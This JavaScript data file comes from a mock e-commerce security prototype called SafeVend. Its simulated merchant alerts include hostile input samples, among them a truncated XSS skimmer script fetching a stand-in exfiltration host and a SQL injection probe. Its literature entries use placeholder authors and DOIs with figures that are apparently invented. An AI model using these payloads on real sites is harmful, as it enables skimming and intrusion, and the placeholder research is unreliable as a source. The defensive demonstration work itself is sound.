/**
 * SafeVend — Plug-and-Play Security for Micro-Merchants
 * data.js: Initial mock datasets, product catalog, research literature placeholders, and threat taxonomies.
 */

const SafeVendData = {
  // Store Catalog for CraftNest (Handmade Artisan Goods)
  products: [
    {
      id: "prod_01",
      name: "Handmade Tote Bag",
      category: "Bags & Accessories",
      price: 999,
      formattedPrice: "₹999",
      rating: 4.9,
      reviews: 42,
      badge: "Bestseller",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g1' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g1)'/><rect x='70' y='75' width='160' height='115' rx='12' fill='%23d97706' opacity='0.85'/><path d='M105 75 C105 35, 195 35, 195 75' stroke='%23fef3c7' stroke-width='8' fill='none' stroke-linecap='round'/><path d='M95 105 L205 105' stroke='%23b45309' stroke-width='3' stroke-dasharray='6,6'/><circle cx='150' cy='140' r='18' fill='%23fef3c7' opacity='0.3'/><text x='150' y='145' font-family='sans-serif' font-size='12' font-weight='bold' fill='%23ffffff' text-anchor='middle'>CraftNest</text></svg>",
      description: "Handcrafted natural cotton canvas tote bag with reinforced double stitching, eco-friendly dye, and brass hardware.",
      inventory: 15,
      sku: "CN-TB-01"
    },
    {
      id: "prod_02",
      name: "Artisan Soy Candle",
      category: "Home & Fragrance",
      price: 499,
      formattedPrice: "₹499",
      rating: 4.8,
      reviews: 28,
      badge: "Popular",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g2' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient><linearGradient id='flame' x1='0' y1='1' x2='0' y2='0'><stop offset='0%25' stop-color='%23ea580c'/><stop offset='50%25' stop-color='%23f59e0b'/><stop offset='100%25' stop-color='%23fef08a'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g2)'/><rect x='100' y='85' width='100' height='100' rx='8' fill='%23e2e8f0' opacity='0.9'/><path d='M150 85 L150 70' stroke='%23334155' stroke-width='4' stroke-linecap='round'/><path d='M150 68 C144 58, 144 48, 150 38 C156 48, 156 58, 150 68 Z' fill='url(%23flame)'/><circle cx='150' cy='52' r='20' fill='%23fef08a' opacity='0.25'/><text x='150' y='140' font-family='sans-serif' font-size='11' fill='%23475569' text-anchor='middle'>LAVENDER & OUD</text></svg>",
      description: "100% organic hand-poured soy wax candle infused with calming wild lavender, smoked oud wood, and botanical oils.",
      inventory: 34,
      sku: "CN-CD-02"
    },
    {
      id: "prod_03",
      name: "Organic Herbal Soap Set",
      category: "Personal Care",
      price: 299,
      formattedPrice: "₹299",
      rating: 4.7,
      reviews: 19,
      badge: "Eco-Friendly",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g3' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g3)'/><rect x='80' y='100' width='140' height='70' rx='10' fill='%2310b981' opacity='0.85'/><rect x='95' y='80' width='110' height='55' rx='8' fill='%2334d399' opacity='0.9'/><path d='M150 70 C145 60, 155 50, 150 40' stroke='%23ecfdf5' stroke-width='3' stroke-linecap='round' fill='none'/><text x='150' y='140' font-family='sans-serif' font-size='12' font-weight='bold' fill='%23ffffff' text-anchor='middle'>NEEM & TEA TREE</text></svg>",
      description: "Triple-milled cold-pressed herbal soap bars rich in unrefined shea butter, neem extract, and therapeutic essential oils.",
      inventory: 40,
      sku: "CN-SP-03"
    },
    {
      id: "prod_04",
      name: "Handcrafted Ceramic Mug",
      category: "Kitchen & Dining",
      price: 649,
      formattedPrice: "₹649",
      rating: 4.9,
      reviews: 31,
      badge: "Studio Edition",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g4' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient><linearGradient id='ceramic' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%2338bdf8'/><stop offset='100%25' stop-color='%230284c7'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g4)'/><rect x='95' y='75' width='100' height='105' rx='14' fill='url(%23ceramic)'/><path d='M195 95 C225 95, 225 155, 195 155' stroke='%2338bdf8' stroke-width='12' fill='none' stroke-linecap='round'/><path d='M110 50 Q115 35 125 45 T140 35' stroke='%2394a3b8' stroke-width='2' fill='none' stroke-linecap='round'/><path d='M130 50 Q135 35 145 45 T160 35' stroke='%2394a3b8' stroke-width='2' fill='none' stroke-linecap='round'/><circle cx='145' cy='125' r='14' fill='%23ffffff' opacity='0.25'/></svg>",
      description: "Stone-glazed ceramic mug thrown by hand on a traditional potter's wheel. Microwave safe and textured matte finish.",
      inventory: 22,
      sku: "CN-MG-04"
    },
    {
      id: "prod_05",
      name: "Bamboo Desk Organizer",
      category: "Office & Stationery",
      price: 799,
      formattedPrice: "₹799",
      rating: 4.6,
      reviews: 14,
      badge: "Zero-Waste",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g5' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g5)'/><polygon points='70,170 110,105 230,105 190,170' fill='%23b45309'/><polygon points='110,105 130,65 250,65 230,105' fill='%23d97706'/><polygon points='190,170 230,105 250,65 210,130' fill='%2392400e'/><text x='150' y='145' font-family='sans-serif' font-size='10' font-weight='bold' fill='%23fef3c7' text-anchor='middle'>BAMBOO CRAFT</text></svg>",
      description: "Modular sustainable bamboo organizer with pen caddy, smartphone slot, and felt-lined stationery compartment.",
      inventory: 18,
      sku: "CN-BO-05"
    },
    {
      id: "prod_06",
      name: "Handmade Vintage Notebook",
      category: "Stationery",
      price: 399,
      formattedPrice: "₹399",
      rating: 4.8,
      reviews: 37,
      badge: "Artisan Choice",
      image: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='220' viewBox='0 0 300 220'><defs><linearGradient id='g6' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%231e293b'/><stop offset='100%25' stop-color='%230f172a'/></linearGradient></defs><rect width='300' height='220' fill='url(%23g6)'/><rect x='90' y='55' width='120' height='140' rx='6' fill='%2378350f'/><line x1='105' y1='55' x2='105' y2='195' stroke='%23fef3c7' stroke-width='3'/><rect x='120' y='80' width='70' height='40' rx='4' fill='%23fef3c7' opacity='0.9'/><text x='155' y='105' font-family='serif' font-size='10' fill='%23451a03' text-anchor='middle'>JOURNAL</text><circle cx='180' cy='160' r='8' fill='%23f59e0b'/></svg>",
      description: "Deckle-edge handmade cotton rag paper journal bound in vegetable-tanned distress leather with wrap-around cord.",
      inventory: 26,
      sku: "CN-NB-06"
    }
  ],

  // Initial Mock Security Alerts for the Merchant Dashboard
  initialAlerts: [
    {
      id: "ALT-8901",
      threatType: "Price Tampering",
      riskLevel: "HIGH",
      severityColor: "red",
      productName: "Handmade Tote Bag",
      expectedValue: "₹999.00",
      receivedValue: "₹0.01",
      affectedComponent: "Checkout Form Payload / Total Amount",
      detectionReason: "Cryptographic state mismatch: Client submitted total ₹0.01 does not match verified catalog catalog price ₹999.00.",
      actionTaken: "Transaction Terminated & Merchant Event Dispatched",
      timestamp: "Today, 10:42 AM",
      ipAddress: "192.168.1.104 (Simulated Attack Client)",
      status: "BLOCKED",
      categoryKey: "priceTampering"
    },
    {
      id: "ALT-8898",
      threatType: "Suspicious Automated Activity",
      riskLevel: "MEDIUM",
      severityColor: "orange",
      productName: "Handcrafted Ceramic Mug",
      expectedValue: "< 3 checkout events/min",
      receivedValue: "18 requests in 4.2 seconds",
      affectedComponent: "Checkout Endpoint Rate Controller",
      detectionReason: "Abnormal velocity surge: Multiple sequential checkout attempts with randomized CVVs.",
      actionTaken: "Temporary IP Throttled & CAPTCHA Triggered",
      timestamp: "Today, 09:18 AM",
      ipAddress: "10.0.4.77 (Automated Script/Crawler)",
      status: "FLAGGED",
      categoryKey: "automatedRequests"
    },
    {
      id: "ALT-8884",
      threatType: "Malicious Input Pattern",
      riskLevel: "HIGH",
      severityColor: "red",
      productName: "Artisan Soy Candle",
      expectedValue: "Standard alphanumeric address format",
      receivedValue: "<script>fetch('https://skimmer-exfil.xyz?c='...",
      affectedComponent: "Address Line 1 Field",
      detectionReason: "Malicious XSS / E-skimming regex signature detected in shipping input payload.",
      actionTaken: "Input Disinfected, Execution Blocked, Incident Logged",
      timestamp: "Yesterday, 04:30 PM",
      ipAddress: "172.16.20.12 (Simulated Bot)",
      status: "BLOCKED",
      categoryKey: "suspiciousInput"
    },
    {
      id: "ALT-8871",
      threatType: "Form Tampering",
      riskLevel: "MEDIUM",
      severityColor: "orange",
      productName: "Bamboo Desk Organizer",
      expectedValue: "DOM Integrity Hash: 0x9f4b2a8d",
      receivedValue: "DOM Integrity Hash: 0x00000000 (Attribute Injected)",
      affectedComponent: "DOM Tree / merchant_recipient_id",
      detectionReason: "Hidden input element 'recipient_acct' modified in client DOM prior to dispatch.",
      actionTaken: "Submission Rejected, Origin Checked",
      timestamp: "Yesterday, 01:15 PM",
      ipAddress: "192.168.1.189",
      status: "BLOCKED",
      categoryKey: "formTampering"
    },
    {
      id: "ALT-8865",
      threatType: "Price Tampering",
      riskLevel: "HIGH",
      severityColor: "red",
      productName: "Organic Herbal Soap Set",
      expectedValue: "₹299.00",
      receivedValue: "₹1.00",
      affectedComponent: "Cart Payload Array",
      detectionReason: "Unit price altered from ₹299 to ₹1 inside POST payload before transmission.",
      actionTaken: "Session Frozen & Token Invalidated",
      timestamp: "04 Oct, 06:12 PM",
      ipAddress: "192.168.1.92",
      status: "BLOCKED",
      categoryKey: "priceTampering"
    },
    {
      id: "ALT-8850",
      threatType: "Suspicious Input Pattern",
      riskLevel: "LOW",
      severityColor: "yellow",
      productName: "Handmade Vintage Notebook",
      expectedValue: "6-digit Postal PIN Code",
      receivedValue: "' OR 1=1 --",
      affectedComponent: "PIN Code Input Box",
      detectionReason: "Classic SQL injection probe pattern detected in strictly numeric postal field.",
      actionTaken: "Sanitized & Rejected with Validation Notice",
      timestamp: "03 Oct, 11:05 AM",
      ipAddress: "192.168.2.14",
      status: "BLOCKED",
      categoryKey: "suspiciousInput"
    },
    {
      id: "ALT-8842",
      threatType: "Suspicious Automated Activity",
      riskLevel: "MEDIUM",
      severityColor: "orange",
      productName: "Handmade Tote Bag",
      expectedValue: "Legitimate Browser Signature",
      receivedValue: "Headless Chrome / Python-Requests User Agent",
      affectedComponent: "Header Heuristic Analyzer",
      detectionReason: "Bot telemetry indicators: Missing browser canvas fingerprint & rapid mouse telemetry anomaly.",
      actionTaken: "Behavioral Challenge Prompted",
      timestamp: "02 Oct, 03:45 PM",
      ipAddress: "198.51.100.41",
      status: "FLAGGED",
      categoryKey: "automatedRequests"
    }
  ],

  // Academic CEC Literature Review (2021–2025) Placeholders for the 7 Verified Papers
  researchPapers: [
    {
      id: "paper-1",
      theme: "SME Cybersecurity",
      title: "Evaluating Cybersecurity Preparedness and Economic Vulnerability in Micro and Small Enterprises",
      authors: "Placeholder: Author et al.",
      year: "2023",
      source: "IEEE Transactions on Engineering Management / SME Security Series",
      keyFinding: "Over 68% of micro-merchants experience attempted payment form attacks within their first year, yet under 12% deploy automated endpoint or transaction security due to high subscription costs and operational friction.",
      limitation: "Focuses predominantly on enterprise cloud integrations (AWS/GCP WAF), omitting lightweight, script-level solutions tailored for static and shared hosting environments.",
      safeVendInsight: "Affirms SafeVend's foundational goal: small sellers need zero-configuration, plug-and-play client validation rather than expensive enterprise SOC dashboards.",
      doi: "10.1109/TEM.2023.PLACEHOLDER"
    },
    {
      id: "paper-2",
      theme: "E-Commerce Security & Skimming",
      title: "MageCart Unveiled: Analyzing Client-Side JavaScript Injections and Payment Skimmers",
      authors: "Placeholder: Author et al.",
      year: "2022",
      source: "ACM Conference on Computer and Communications Security (CCS)",
      keyFinding: "Client-side skimming exploits third-party checkout scripts to read unencrypted DOM fields without alerting the backend payment gateway, resulting in silent merchant credential exfiltration.",
      limitation: "Proposes deep runtime sandboxing (Shadow DOM instrumentation) which introduces unacceptable latency (over 450ms) on low-powered mobile devices.",
      safeVendInsight: "SafeVend addresses this by isolating checkout forms with immutable event listeners and strict DOM integrity verification before submission.",
      doi: "10.1145/3548606.PLACEHOLDER"
    },
    {
      id: "paper-3",
      theme: "Transaction & Price Manipulation",
      title: "Integrity Vulnerabilities in Decoupled Headless E-Commerce Checkouts",
      authors: "Placeholder: Author et al.",
      year: "2024",
      source: "Computers & Security (Elsevier)",
      keyFinding: "Client-driven price calculations without two-way deterministic checksum validation allow malicious actors to rewrite cart totals via browser developer tools or intercepted webhooks.",
      limitation: "Assumes merchants have dedicated backend API developers who can manage dynamic HMAC cryptographic tokens and Redis session caches.",
      safeVendInsight: "SafeVend provides a simplified client-to-server transaction checksum contract that validates expected product prices against verified catalog rules.",
      doi: "10.1016/j.cose.2024.PLACEHOLDER"
    },
    {
      id: "paper-4",
      theme: "Web Application Security & XSS",
      title: "Taxonomy of Modern Cross-Site Scripting Vectors in E-Commerce Form Pipelines",
      authors: "Placeholder: Author et al.",
      year: "2023",
      source: "Journal of Information Security and Applications",
      keyFinding: "Polymorphic input patterns in customer shipping and billing notes frequently bypass generic string filters unless strict context-aware sanitization and DOM property bindings are enforced.",
      limitation: "Benchmarks were performed on traditional PHP/WordPress monoliths rather than modern single-page and micro-merchant jamstack checkouts.",
      safeVendInsight: "Validates SafeVend's strict policy of using safe DOM manipulation (textContent, no unescaped innerHTML) and real-time input sanitization.",
      doi: "10.1016/j.jisa.2023.PLACEHOLDER"
    },
    {
      id: "paper-5",
      theme: "Automated & Bot Requests",
      title: "Credential Stuffing and Rapid Checkout Automation: Threat Modeling for Small E-Tailers",
      authors: "Placeholder: Author et al.",
      year: "2024",
      source: "Springer Cybersecurity & Privacy Conference",
      keyFinding: "Low-and-slow automated scripts emulate natural checkout velocities to harvest gift cards and validate stolen test credentials on micro-merchant gateways.",
      limitation: "Heavy reliance on intrusive commercial CAPTCHAs that increase cart abandonment rates by up to 24% for genuine shoppers.",
      safeVendInsight: "SafeVend employs non-intrusive client velocity tracking and interaction heuristics to flag bot bursts before blocking normal checkouts.",
      doi: "10.1007/s42378-024.PLACEHOLDER"
    },
    {
      id: "paper-6",
      theme: "Security Usability for Small Businesses",
      title: "Human Factors in Micro-Merchant Cyber Defense: Why Complex Dashboards Fail",
      authors: "Placeholder: Author et al.",
      year: "2021",
      source: "International Journal of Human-Computer Studies",
      keyFinding: "Small business owners ignore 85% of cybersecurity warning emails when logs contain technical jargon, preferring binary status indicators (Safe vs Blocked) and clear explanations.",
      limitation: "Did not evaluate visual color-coded alert taxonomies in real-time e-commerce operational environments.",
      safeVendInsight: "Guides SafeVend's user interface design: simplified traffic-light status, plain-English incident summaries, and single-click forensic inspection.",
      doi: "10.1016/j.ijhcs.2021.PLACEHOLDER"
    },
    {
      id: "paper-7",
      theme: "Cyber Risk Assessment",
      title: "Quantifying Cascading Economic Harm from E-Commerce Breaches in Developing Markets",
      authors: "Placeholder: Author et al.",
      year: "2025",
      source: "Information Systems Frontiers",
      keyFinding: "A single payment tampering or data breach event causes an average 42% loss in consumer trust for artisan/independent sellers, directly threatening SDG 8 sustainability.",
      limitation: "Theoretical risk models lacked demonstrable open-source prototypes designed specifically for local micro-retailers.",
      safeVendInsight: "Directly reinforces SafeVend's mission: aligning grassroots cybersecurity with UN SDG 8 (Decent Work & Economic Growth) and SDG 12 (Responsible Consumption).",
      doi: "10.1007/s10796-025.PLACEHOLDER"
    }
  ],

  // Conceptual Comparison Table: Traditional Enterprise Security vs SafeVend
  comparisonMatrix: [
    {
      criterion: "Deployment Cost",
      enterprise: "High ($2,000 – $15,000+/year) + Setup Fees",
      safeVend: "Free Open-Source Core / Low-cost SaaS tier",
      highlight: true
    },
    {
      criterion: "Setup & Integration",
      enterprise: "Complex (DNS redirection, reverse proxy, custom CI/CD)",
      safeVend: "Plug-and-play script tag (`<script src='safevend.js'>`)",
      highlight: true
    },
    {
      criterion: "Technical Expertise Required",
      enterprise: "High (Requires dedicated SecOps / DevSecOps engineers)",
      safeVend: "Minimal (Designed for artisan non-technical store owners)",
      highlight: true
    },
    {
      criterion: "Primary Target Audience",
      enterprise: "Fortune 500 & high-volume e-commerce enterprises",
      safeVend: "Micro-merchants, local sellers, independent artisans",
      highlight: true
    },
    {
      criterion: "Security Visibility",
      enterprise: "Overwhelming SIEM logs (Splunk, Datadog, Cloudflare)",
      safeVend: "Clean, visual merchant dashboard with plain-language alerts",
      highlight: false
    },
    {
      criterion: "Alerting Mechanism",
      enterprise: "Complex PagerDuty / Webhook rule configuration",
      safeVend: "One-click readable alert cards & actionable mitigations",
      highlight: false
    },
    {
      criterion: "Checkout Latency Impact",
      enterprise: "Can introduce 150ms – 400ms external proxy lag",
      safeVend: "Sub-10ms ultra-lightweight client-side verification",
      highlight: false
    }
  ],

  // Future Roadmap Phases
  roadmap: [
    {
      phase: "PHASE 1",
      title: "Interactive Client Security Prototype",
      status: "CURRENT PROTOTYPE",
      description: "Stand-alone HTML5/CSS3/Vanilla JS simulation environment demonstrating price integrity, input sanitization, form defense, and interactive merchant telemetry.",
      items: [
        "In-browser security simulation engine",
        "Visual transaction verification pipeline",
        "Dynamic merchant dashboard & SVG charts",
        "Academic CEC presentation testbed"
      ]
    },
    {
      phase: "PHASE 2",
      title: "Backend Verification Integration",
      status: "FUTURE IMPLEMENTATION",
      description: "Lightweight Node.js/Python microservice providing authoritative two-way transaction validation and database state locking.",
      items: [
        "Server-side price matrix verification",
        "HTTPS-only payload transport with HSTS",
        "Secure session state with HTTP-only cookies",
        "Database pricing sync engine"
      ]
    },
    {
      phase: "PHASE 3",
      title: "Cryptographic Transaction Integrity",
      status: "FUTURE IMPLEMENTATION",
      description: "Cryptographic signing layer guaranteeing that checkout payloads cannot be intercepted or modified in flight.",
      items: [
        "HMAC-SHA256 client transaction hashes",
        "Ephemeral one-time checkout nonces",
        "Replay attack prevention tokens",
        "Public/private key verification handshake"
      ]
    },
    {
      phase: "PHASE 4",
      title: "Heuristic Threat Detection & CSP",
      status: "FUTURE IMPLEMENTATION",
      description: "Automated behavioral telemetry and Content Security Policy (CSP) enforcement to stop MageCart-style unauthorized script injections.",
      items: [
        "Strict Content-Security-Policy headers",
        "Subresource Integrity (SRI) validation",
        "Adaptive velocity-based rate limiting",
        "Client DOM mutation observer daemon"
      ]
    },
    {
      phase: "PHASE 5",
      title: "Real-Time Merchant Alert Notification",
      status: "FUTURE IMPLEMENTATION",
      description: "Immediate multi-channel alerts connecting small merchants to their storefront security status via channels they already use.",
      items: [
        "Instant WhatsApp & SMS threat notifications",
        "Automated daily security health digests",
        "Single-tap transaction kill switch",
        "Incident forensic export (PDF/CSV)"
      ]
    },
    {
      phase: "PHASE 6",
      title: "Pilot with Local Micro-Merchants",
      status: "FUTURE IMPLEMENTATION",
      description: "Field deployment and empirical testing with 25+ local craft sellers and artisan cooperative stores across regional markets.",
      items: [
        "Real-world checkout usability testing",
        "Cart abandonment rate impact analysis",
        "Merchant feedback refinement cycle",
        "Academic empirical paper publication"
      ]
    },
    {
      phase: "PHASE 7",
      title: "Multi-Platform Plugins & Scaled SDK",
      status: "FUTURE IMPLEMENTATION",
      description: "One-click extensions for popular micro-merchant platforms and static headless site builders.",
      items: [
        "WooCommerce & Shopify lightweight plugin",
        "Wix, Squarespace & Dukaan script integration",
        "Zero-dependency NPM and CDN distribution",
        "Open-source community governance model"
      ]
    }
  ]
};

// Export to global scope
if (typeof window !== "undefined") {
  window.SafeVendData = SafeVendData;
}
